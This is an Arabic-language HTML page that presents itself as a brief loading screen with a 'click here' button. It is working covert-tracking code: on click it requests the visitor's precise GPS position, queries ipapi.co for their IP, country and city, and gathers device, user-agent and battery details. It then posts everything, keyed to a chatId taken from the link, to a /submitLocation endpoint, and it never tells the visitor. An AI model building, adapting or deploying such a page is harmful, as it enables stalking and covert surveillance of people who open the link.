<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <title>تسجيل الموقع</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');

        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: #fff;
        }

        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
            transform: rotate(45deg);
            animation: animate 5s linear infinite;
        }

        @keyframes animate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading {
            border: 8px solid rgba(243, 243, 243, 0.2);
            border-top: 8px solid #e74c3c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .message {
            font-size: 20px;
            color: #ecf0f1;
            margin-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <button onclick="getLocation()">اضغط هنا</button>
        <div class="loading" id="loading" style="display: none;"></div>
        <p class="message" id="notification">لحظة واحدة من فضلك...</p>
    </div>

    <form method="POST" action="/submitLocation" id="location-form">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="additionalData" id="additionalData">
    </form>

    <script>
        async function getLocation() {
            showLoading(true);
            showNotification('جارِ جمع الموقع...');

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, handleError, { enableHighAccuracy: true });
            } else {
                showNotification('عذرًا، متصفحك لا يدعم تحديد الموقع', true);
                showLoading(false);
            }
        }

        async function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const chatId = getParameterByName('chatId');

            if (!chatId) {
                showNotification('خطأ: معرف المحادثة غير موجود', true);
                showLoading(false);
                return;
            }

            document.getElementById("latitude").value = latitude;
            document.getElementById("longitude").value = longitude;
            document.getElementById("chatId").value = chatId;

            try {
                const additionalData = await collectAdditionalData();
                document.getElementById("additionalData").value = JSON.stringify(additionalData);
                document.getElementById("location-form").submit();
            } catch (error) {
                showNotification(`حدث خطأ: ${error.message}`, true);
                showLoading(false);
            }
        }

        async function collectAdditionalData() {
            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
            const platformInfo = getPlatformInfo();
            const batteryInfo = await getBatteryInfo();

            return {
                ip: ipInfo.ip,
                country: ipInfo.country_name,
                city: ipInfo.city,
                platform: platformInfo.platform,
                deviceVersion: getDeviceVersion(),
                batteryLevel: batteryInfo.level,
                batteryCharging: batteryInfo.charging,
            };
        }

        function getPlatformInfo() {
            const ua = navigator.userAgent;
            if (/Windows/.test(ua)) return { platform: "Windows" };
            if (/Mac/.test(ua)) return { platform: "MacOS" };
            if (/Linux/.test(ua)) return { platform: "Linux" };
            if (/Android/.test(ua)) return { platform: "Android" };
            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
            return { platform: "Unknown" };
        }

        function getDeviceVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/\(([^)]+)\)/);
            return match ? match[1] : 'Unknown';
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging
                };
            }
            return { level: 'غير متاح', charging: 'غير متاح' };
        }

        function handleError(error) {
            showLoading(false);
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    showNotification('المستخدم رفض طلب تحديد الموقع', true);
                    break;
                case error.POSITION_UNAVAILABLE:
                    showNotification('معلومات الموقع غير متاحة', true);
                    break;
                case error.TIMEOUT:
                    showNotification('انتهت مهلة الحصول على الموقع', true);
                    break;
                case error.UNKNOWN_ERROR:
                    showNotification('حدث خطأ غير معروف', true);
                    break;
            }
        }

        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                  results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        function showNotification(message, isError = false) {
            const notificationElement = document.getElementById('notification');
            notificationElement.textContent = message;
            notificationElement.style.color = isError ? '#e74c3c' : '#ecf0f1';
        }

        function showLoading(show) {
            document.getElementById('loading').style.display = show ? 'block' : 'none';
        }
    </script>
</body>
</html>
